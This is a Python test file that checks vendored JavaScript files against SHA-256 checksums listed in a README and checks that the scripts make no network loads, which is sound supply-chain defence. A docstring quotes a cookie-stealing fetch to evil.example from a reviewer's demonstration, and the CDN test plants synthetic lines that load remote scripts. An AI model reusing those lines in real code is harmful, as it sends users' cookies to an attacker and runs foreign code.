"""The vendored third-party files must be the ones the README claims.

WHY THIS EXISTS
---------------
``src/product_app/static/vendor/README.md`` has carried a "SHA-256 checksums"
block since Swagger UI was vendored in July. Measured 2026-08-05, before this
file: ``grep -rn "shasum\\|sha256" tests/ scripts/ Makefile .github/workflows/``
returned **nothing**. The hashes were prose. Nothing compared them to the files,
so a stale hash, a hand-edited hash, or a swapped binary would have survived
indefinitely — and the README described the arrangement as "pinned", which two
later documents (ADR-0014 and a handoff) then repeated as if it were enforced.

That matters more now than it did: ADR-0014 adds ``markdown-it`` to this
directory, and it runs on every provider answer in the workspace. A vendored
parser whose bytes nobody checks is a supply-chain hole with a documentation
sticker over it.

The gate is hermetic and offline: it hashes what is on disk and compares it to
what the README says. It never fetches anything.

WHAT TURNS EACH TEST RED — stated per test below.
"""

from __future__ import annotations

import hashlib
import re
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
VENDOR_DIR = REPO_ROOT / "src" / "product_app" / "static" / "vendor"
VENDOR_README = VENDOR_DIR / "README.md"

#: A ``shasum -a 256`` line: 64 hex digits, whitespace, then the filename.
_CHECKSUM_LINE = re.compile(r"^([0-9a-f]{64})\s+(\S+)$", re.MULTILINE)

#: Files that are documentation about the directory, not vendored payload.
_NOT_PAYLOAD = {"README.md"}


def _readme_checksums() -> dict[str, str]:
    """Parse the README's checksum block into ``{filename: sha256}``."""
    return {
        name: digest
        for digest, name in _CHECKSUM_LINE.findall(VENDOR_README.read_text(encoding="utf-8"))
    }


def _vendored_files() -> list[Path]:
    """Every payload file under the vendor directory, AT ANY DEPTH.

    ``rglob``, not ``iterdir``. The first version of this gate used ``iterdir``,
    which does not recurse, and an adversarial reviewer demonstrated the hole
    end to end: a hostile ``vendor/dist/plugin.min.js`` containing
    ``fetch("https://evil.example/" + document.cookie)`` was served 200 from the
    app's own origin — so ``script-src 'self'`` permits it — while this file
    reported ``6 passed``. Reproduced here before the fix; it now fails.
    """
    return sorted(p for p in VENDOR_DIR.rglob("*") if p.is_file() and p.name not in _NOT_PAYLOAD)


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def test_every_pinned_checksum_matches_the_file_on_disk() -> None:
    """Each hash in the README must be the real hash of that file.

    What turns it red: replace, re-download or edit any vendored file without
    updating its line in the README's checksum block.
    """
    pinned = _readme_checksums()
    # Positive partner. Every assertion below iterates ``pinned``, and an empty
    # dict would satisfy all of them while measuring nothing — the exact shape
    # this repo's gate-floor rule exists to forbid. Four files are vendored
    # today; the floor asserts the block is non-empty rather than a count, so
    # adding a fifth does not need this line edited (the mirror test below is
    # what catches an unlisted file).
    assert pinned, (
        "no `<sha256>  <filename>` lines found in "
        f"{VENDOR_README.relative_to(REPO_ROOT)} — the checksum block moved or "
        "its format changed. Restore it; do not delete this gate."
    )

    # The comparison lives in `_compare` so the bite-proof below can drive the
    # SAME code path with mutated inputs instead of re-implementing it.
    _compare(pinned=pinned, vendor_dir=VENDOR_DIR)


def test_no_vendored_file_is_unpinned() -> None:
    """The mirror check: a file in the directory with no line in the README.

    Without this, the test above is satisfied by pinning ONE file and dropping
    the rest — the "negative check over nothing" failure this repo has measured
    in 13 of its own CI jobs.

    What turns it red: add a file to ``static/vendor/`` without adding its
    checksum to the README.
    """
    files = _vendored_files()
    assert files, (
        f"no vendored files found in {VENDOR_DIR.relative_to(REPO_ROOT)} — the "
        "directory moved. This gate refuses to pass over an empty input."
    )
    pinned = set(_readme_checksums())
    # Compare on the path RELATIVE to the vendor directory, so a nested file is
    # named unambiguously — `dist/plugin.min.js`, not a bare `plugin.min.js`
    # that could collide with a top-level entry.
    unpinned = sorted(
        str(p.relative_to(VENDOR_DIR))
        for p in files
        if p.name not in pinned and str(p.relative_to(VENDOR_DIR)) not in pinned
    )
    assert not unpinned, (
        f"vendored but not pinned in {VENDOR_README.relative_to(REPO_ROOT)}: "
        f"{unpinned}. Run `shasum -a 256` on them and add the lines."
    )


def test_markdown_it_is_the_version_the_docs_name() -> None:
    """The parser's own banner must agree with the version the README pins.

    A checksum proves the bytes did not change; it says nothing about whether
    the version NUMBER written next to it is the truth. markdown-it ships its
    version in the first line of its dist banner, so the two are comparable
    without a network call.

    What turns it red: bump the file to another version without editing the
    provenance table, or edit the table without bumping the file.
    """
    parser = VENDOR_DIR / "markdown-it.min.js"
    assert parser.is_file(), "the vendored markdown-it parser is missing"

    banner = parser.read_text(encoding="utf-8", errors="replace")[:200]
    in_file = re.search(r"markdown-it (\d+\.\d+\.\d+)", banner)
    assert in_file, (
        "markdown-it.min.js no longer starts with its `/*! markdown-it <version> ... */` "
        f"banner; first 200 chars were {banner!r}"
    )

    readme = VENDOR_README.read_text(encoding="utf-8")
    in_readme = re.search(r"`markdown-it\.min\.js`\s*\|[^|]*\|\s*(\d+\.\d+\.\d+)\s*\|", readme)
    assert in_readme, (
        "the provenance table in vendor/README.md no longer has a "
        "`markdown-it.min.js` row in the form this gate reads."
    )
    assert in_file.group(1) == in_readme.group(1), (
        f"vendored markdown-it is {in_file.group(1)}; vendor/README.md's "
        f"provenance table says {in_readme.group(1)}."
    )


def _compare(*, pinned: dict[str, str], vendor_dir: Path) -> None:
    """The comparison ``test_every_pinned_checksum_matches_the_file_on_disk``
    performs, extracted so the bite-proof can drive it with mutated inputs.

    Split out because the first version of that bite-proof did NOT drive it: it
    re-implemented two `assert _sha256(...) ==` lines of its own, so neutering
    the real assertion left it green. An adversarial reviewer demonstrated
    exactly that — "mutation A: neuter the equality assertion → 6 passed" — and
    the docstring claiming otherwise was the finding.
    """
    assert pinned, "no `<sha256>  <filename>` lines found"
    for name, expected in sorted(pinned.items()):
        path = vendor_dir / name
        assert path.is_file(), f"pinned but missing: {name}"
        actual = _sha256(path)
        assert actual == expected, (
            f"{name} does not match its pinned checksum.\n"
            f"  README says: {expected}\n"
            f"  on disk    : {actual}\n"
            "Re-download the pinned version, or update the README block if the "
            "bump is deliberate (`shasum -a 256 *.js *.css *.png`)."
        )


def test_the_checksum_gate_bites(tmp_path: Path) -> None:
    """The comparison must FAIL on a wrong hash, not merely pass on a right one.

    It drives ``_compare`` — the SAME function the real test calls — rather than
    a private re-implementation, so deleting the equality assertion turns this
    red too. That was the reviewer's finding: the old version asserted on its
    own inline copy and was satisfied by a gutted gate.

    Mutation is done in a temp directory, never on the real tree, so this can
    never leave a half-reverted vendored file behind for the next agent
    (AGENTS.md rule 12b).

    What turns it red: make ``_compare`` stop comparing.
    """
    payload = tmp_path / "thing.js"
    payload.write_bytes(b"the real bytes")
    real = hashlib.sha256(b"the real bytes").hexdigest()

    # Right hash: passes.
    _compare(pinned={"thing.js": real}, vendor_dir=tmp_path)

    # Wrong hash: must raise, and must name both numbers.
    with pytest.raises(AssertionError) as caught:
        _compare(pinned={"thing.js": "0" * 64}, vendor_dir=tmp_path)
    assert "does not match its pinned checksum" in str(caught.value)
    assert real in str(caught.value)

    # A pinned file that does not exist: must raise rather than skip.
    with pytest.raises(AssertionError) as missing:
        _compare(pinned={"absent.js": real}, vendor_dir=tmp_path)
    assert "pinned but missing" in str(missing.value)

    # An empty block: must raise rather than pass over nothing.
    with pytest.raises(AssertionError):
        _compare(pinned={}, vendor_dir=tmp_path)

    # And the line parser itself must find nothing in text that has none.
    assert _CHECKSUM_LINE.findall("no checksums here at all") == []
    assert _CHECKSUM_LINE.findall(f"{real}  thing.js") == [(real, "thing.js")]


@pytest.mark.parametrize("name", ["markdown-it.min.js", "swagger-ui-bundle.js"])
def test_vendored_scripts_are_served_from_this_repo_not_a_cdn(name: str) -> None:
    """No vendored script may reach out to a CDN at load time.

    The whole point of this directory is that the strict CSP
    (``script-src 'self'``) never has to allow a third party. A vendored file
    that fetches its own dependencies defeats that silently.

    What turns it red: vendor a build that injects a `<script src="https://...">`
    or imports over the network.
    """
    text = (VENDOR_DIR / name).read_text(encoding="utf-8", errors="replace")

    # `import(` / `importScripts(` with an absolute URL, or a script element
    # pointed at another origin. Deliberately narrow: matching every "https://"
    # would fire on the licence banner and on documentation URLs in comments.
    def _network_loads(source: str) -> list[str]:
        found = re.findall(r"""(?:importScripts|import)\s*\(\s*["']https?://[^"']+""", source)
        found += re.findall(r"""\.src\s*=\s*["']https?://[^"']+""", source)
        return found

    assert not _network_loads(text), f"{name} loads code over the network"

    # POSITIVE PARTNER. `assert not offenders` is trivially true over a pattern
    # that matches nothing, and a reviewer proved it: replacing the whole regex
    # with one that can never match left this test green. So the pattern must be
    # shown to FIRE on a synthetic offender, every run.
    planted = 'var s=document.createElement("script");s.src="https://evil.example/x.js";'
    assert _network_loads(planted), (
        "the network-load pattern no longer matches a script that loads code "
        "from another origin, so the assertion above is checking nothing"
    )
    assert _network_loads('import("https://evil.example/m.js")'), (
        "the network-load pattern no longer matches a remote dynamic import"
    )
